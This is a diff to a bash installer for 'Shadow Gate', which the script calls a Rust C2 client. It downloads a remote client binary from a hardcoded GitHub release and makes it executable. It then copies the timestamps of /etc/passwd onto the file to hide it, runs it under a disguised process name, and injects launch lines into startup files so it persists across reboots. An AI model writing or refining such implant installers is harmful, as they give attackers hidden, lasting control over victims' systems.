@@ -1,4 +1,3 @@
-
 #!/usr/bin/env bash
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -217,10 +216,7 @@ download_binary() {
 	local download_url="$2"
 	
 	# Set default download URL if not provided
-	if [[ -z "$download_url" ]]; then
-		# Default to GitHub releases or your custom URL
-		download_url="https://github.com/Haxor-World/Shadow-Gate/releases/download/1.0.0/monitor-${OS_NAME}-${OS_ARCH}"
-	fi
+	download_url="https://github.com/Haxor-World/Shadow-Gate/releases/download/1.0.0/client-${OS_NAME}-${OS_ARCH}"
 	
 	print_debug "Downloading binary from: $download_url"
 	print_debug "Target path: $target_path"
@@ -236,11 +232,19 @@ download_binary() {
 	
 	# Make executable and fix timestamps
 	chmod +x "$target_path" || return 1
+	touch -r "/etc/passwd" "$target_path" &>"$ERR_LOG"
+	touch -r "/etc" "$(dirname "$target_path")" &>"$ERR_LOG"
 	
 	return 0
 }
 
-exec_hidden() {	
+exec_hidden() {
+	# Check if client is already running to prevent double execution
+	if pgrep -f "${PROC_HIDDEN_NAME}" >/dev/null 2>&1; then
+		print_debug "Client already running with process name: ${PROC_HIDDEN_NAME}"
+		return 0
+	fi
+	
 	# Validate required variables
 	if [[ -z "${SECRET}" ]]; then
 		print_error "Missing required SECRET environment variable"
@@ -269,20 +273,33 @@ install_init_scripts() {
 		return 1
 	fi
 	
+	# Check if Shadow Gate with same process name is already installed
+	for target in "${inject_targets[@]}"; do
+		[[ ! -f "$target" ]] && continue
+		if grep -q "${PROC_HIDDEN_NAME}" "$target" &>"$ERR_LOG"; then
+			print_status "!! WARNING !! Shadow Gate client with process name '${PROC_HIDDEN_NAME}' already installed via $(basename "$target")"
+			print_status "Installation aborted to prevent conflicts"
+			return 1
+		fi
+	done
+	
 	# Build environment variables string
 	local env_vars="SECRET='${SECRET}'"
 	[[ -n "${SERVER_URL}" ]] && env_vars="${env_vars} SERVER_URL='${SERVER_URL}'"
 	INJECT_LINE="
-HOME=$HOME ${env_vars} $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${CLIENT_PATH}\" &>/dev/null &"
+if ! pgrep -f '${PROC_HIDDEN_NAME}' >/dev/null 2>&1; then
+	set +m; HOME=$HOME ${env_vars} $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${CLIENT_PATH}\" &>/dev/null &
+fi"
+	
 	for target in "${inject_targets[@]}"; do
-		[[ ! -f $target ]] && continue
+		[[ ! -f "$target" ]] && continue
 		print_progress "Installing access via $(basename "$target")"
-	if inject_to_file "$target" "$INJECT_LINE"; then
-		print_ok 
-		success=1 
-	else
-		print_fail
-	fi
+		if inject_to_file "$target" "$INJECT_LINE"; then
+			print_ok 
+			success=1 
+		else
+			print_fail
+		fi
 	done
 	[[ -z $success ]] && return 1
 	return 0
@@ -292,6 +309,7 @@ install() {
 	if [[ -n $NO_INSTALL ]]; then
 		print_status "NO_INSTALL is set. Skipping installation." && return 0
 	fi
+	
 	print_progress "Installing Rust C2 client permanently" && print_ok
   
 	local is_installed=false
@@ -335,11 +353,6 @@ print_usage() {
 	echo -e "${BRIGHT_WHITE}   Process Name: ${BRIGHT_CYAN}$PROC_HIDDEN_NAME${RESET}"
 	echo -e "${BRIGHT_WHITE}   Binary Location: ${BRIGHT_CYAN}$CLIENT_PATH${RESET}"
 	echo
-	echo -e "${BRIGHT_WHITE}${BOLD}Persistence Configuration:${RESET}"
-	echo -e "${BRIGHT_WHITE}   Persistence Method: ${BRIGHT_CYAN}${PERSISTENCE_METHOD}${RESET}"
-	echo -e "${DIM}${GRAY}═══════════════════════════════════════════════════════════════${RESET}"
-	echo -e "${DIM}${GRAY}Shadow Gate is now running ${RESET}"
-	echo -e "${DIM}${GRAY}═══════════════════════════════════════════════════════════════${RESET}\n"
 }
 
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
@@ -398,7 +411,6 @@ fi
 install ||  print_error "Permanent install methods failed! Access will be lost after reboot."
 
 print_progress "Triggering initial execution"
-
 if exec_hidden; then 
   print_ok 
 else 
